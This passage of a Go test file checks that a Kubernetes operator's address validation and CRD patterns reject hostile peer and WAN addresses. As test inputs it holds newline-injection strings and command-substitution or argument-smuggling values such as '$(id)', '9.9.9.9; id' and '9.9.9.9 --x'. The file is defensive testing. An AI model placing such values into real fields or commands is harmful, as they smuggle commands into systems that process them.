	z.Spec.ExternalPeers = []string{"10.0.0.1:7777\ninjected: line", "evil host:7777"}
	z.Spec.WanAddress = "9.9.9.9\nx"
	cond := peerAddressesCondition(invalidSpecPeerAddresses(z), nil)
	if strings.Contains(cond.Message, "\n") {
		t.Fatalf("message carries a raw newline: %q", cond.Message)
	}
	for _, want := range []string{`"10.0.0.1:7777\ninjected: line"`, `"evil host:7777"`, `"9.9.9.9\nx"`} {
		if !strings.Contains(cond.Message, want) {
			t.Errorf("message %q lacks the quoted value %s", cond.Message, want)
		}
	}
	if strings.Count(cond.Message, "evil host") != 1 {
		t.Errorf("a value appears outside its quoted form: %q", cond.Message)
	}
}

// TestDeriveValidExternalPeersTrimsAddresses: surrounding whitespace on a topology address is trimmed before
// validation (the old renderer trimmed too), so a padded but valid row is kept.
func TestDeriveValidExternalPeersTrimsAddresses(t *testing.T) {
	rows := []topoRow{{operator: "op-B", cluster: "c", node: "n", address: " 5.6.7.8:7777\t",
		reachability: oramav1alpha1.ReachabilityWANAccessible, status: topoStatusActive, updatedAt: "2026-10-09T00:00:00Z"}}
	valid, dropped := deriveValidExternalPeers(rows, "op-A", "c", nil)
	if !slices.Equal(valid, []string{"5.6.7.8:7777"}) || len(dropped) != 0 {
		t.Errorf("valid = %q, dropped = %q", valid, dropped)
	}
}

// TestNoteDroppedTopologyPeersLogsOncePerChange: a steady set of hostile rows is logged once, a change is
// logged again, and an empty set logs nothing.
func TestNoteDroppedTopologyPeersLogsOncePerChange(t *testing.T) {
	var lines []string
	log := funcr.New(func(prefix, args string) { lines = append(lines, args) }, funcr.Options{})
	r := &OramaZettaClusterReconciler{}
	r.noteDroppedTopologyPeers(log, "ns/z", "c", []string{"a b", "$(x)"})
	r.noteDroppedTopologyPeers(log, "ns/z", "c", []string{"$(x)", "a b"})
	if len(lines) != 1 {
		t.Fatalf("logged %d times for an unchanged set, want 1", len(lines))
	}
	r.noteDroppedTopologyPeers(log, "ns/z", "c", []string{"$(y)"})
	if len(lines) != 2 {
		t.Fatalf("a changed set was not logged")
	}
	r.noteDroppedTopologyPeers(log, "ns/z", "c", nil)
	r.noteDroppedTopologyPeers(log, "ns/z", "c", nil)
	if len(lines) != 2 {
		t.Fatalf("an empty set was logged")
	}
}

// crdStringRule reads a string property's pattern and maxLength from the generated OramaZettaCluster CRD.
func crdStringRule(t *testing.T, path ...string) (*regexp.Regexp, int64) {
	t.Helper()
	raw, err := os.ReadFile("../../config/crd/bases/orama.cloud_oramazettaclusters.yaml")
	if err != nil {
		t.Fatal(err)
	}
	var crd apiextensionsv1.CustomResourceDefinition
	if err := yaml.Unmarshal(raw, &crd); err != nil {
		t.Fatal(err)
	}
	schema := crd.Spec.Versions[0].Schema.OpenAPIV3Schema.Properties["spec"]
	for _, p := range path {
		if p == "[]" {
			schema = *schema.Items.Schema
		} else {
			schema = schema.Properties[p]
		}
	}
	if schema.Pattern == "" || schema.MaxLength == nil {
		t.Fatalf("spec.%v has no pattern/maxLength in the generated CRD", path)
	}
	return regexp.MustCompile(schema.Pattern), *schema.MaxLength
}

// TestZettaCRDPatternsFromGeneratedYAML checks the generated CRD's patterns without an API server (the
// envtest twin, TestZettaCRDRefusesInvalidPeers, skips without KUBEBUILDER_ASSETS). The API server matches
// CRD patterns with Go's regexp, so compiling them here is the same check.
func TestZettaCRDPatternsFromGeneratedYAML(t *testing.T) {
	peer, peerMax := crdStringRule(t, "externalPeers", "[]")
	wan, wanMax := crdStringRule(t, "wanAddress")
	accepts := func(re *regexp.Regexp, max int64, v string) bool { return int64(len(v)) <= max && re.MatchString(v) }
	for _, ok := range []string{"1.2.3.4:7777", "zetta.example.com:65535", "[fd00::1]:7777", "a:1"} {
		if !accepts(peer, peerMax, ok) {
			t.Errorf("externalPeers pattern refuses valid %q", ok)
		}
		if validateZettaPeerAddress(ok) != nil {
			t.Errorf("controller refuses %q that the CRD accepts", ok)
		}
	}
	for _, bad := range append(maliciousPeers("/tmp/m"), " 1.2.3.4:7777", "1.2.3.4:7777 ", "1.2.3.4:07777",
		strings.Repeat("a.", 130)+"b:7777") {
		if accepts(peer, peerMax, bad) {
			t.Errorf("externalPeers pattern accepts %q", bad)
		}
	}
	for _, ok := range []string{"9.9.9.9", "9.9.9.9:7777", "zetta.example.com", "fd00::2", "[fd00::1]", "[fd00::1]:7777"} {
		if !accepts(wan, wanMax, ok) {
			t.Errorf("wanAddress pattern refuses valid %q", ok)
		}
	}
	for _, bad := range []string{"9.9.9.9; id", "$(id)", "a,b", "9.9.9.9:70000", "9.9.9.9 --x", "a\nb"} {
		if accepts(wan, wanMax, bad) {
			t.Errorf("wanAddress pattern accepts %q", bad)
		}
	}
}
